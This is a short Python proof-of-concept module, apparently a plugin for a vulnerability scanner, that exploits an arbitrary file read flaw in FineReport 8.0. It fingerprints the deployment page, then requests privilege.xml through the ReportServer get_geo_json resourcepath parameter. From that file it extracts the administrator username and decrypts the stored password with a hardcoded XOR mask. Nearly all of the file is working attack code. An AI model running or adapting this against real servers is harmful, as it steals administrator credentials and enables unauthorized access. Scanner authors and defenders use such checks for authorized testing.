# -*- coding:utf-8 -*-
# 帆软报表8.0 任意文件读取
import re

from ServiceScanModel.models import ServiceScan
from vulscan_Project.requestClass import Requests


def decrypt(cipher):
    PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23]  # 掩码
    password = ""
    cipher = cipher[3:]  # 截断三位后
    for i in range(int(len(cipher) / 4)):
        c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
        c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
        password = password + chr(c2)
    return password

class POC:

    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil= Requests(service.cookies)
        self.result = False


    def fineport_file_poc(self, filename="privilege.xml", type="poc"):
        resp = self.requestUtil.get(self.service.url + "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=%s" % filename)
        if type == "poc":
            info_list = (re.findall("<!\[CDATA\[(.*?)]]>", resp.text))[:2]
            return (info_list[0], decrypt(info_list[1]))
        else:
            return resp.text


    def fingerprint(self):
        try:
            if self.service.url:
                resp = self.requestUtil.get(self.service.url + "/WebReport/ReportServer")
                if "部署页面" in resp.text:
                    return True
        except:
            return False


    def poc(self):
        try:
            result = self.fineport_file_poc()
            if result:
                return ["帆软报表8.0 任意文件读取", "用户名: %s<br>密码: %s" % (result[0], result[1])]
        except:
            return []
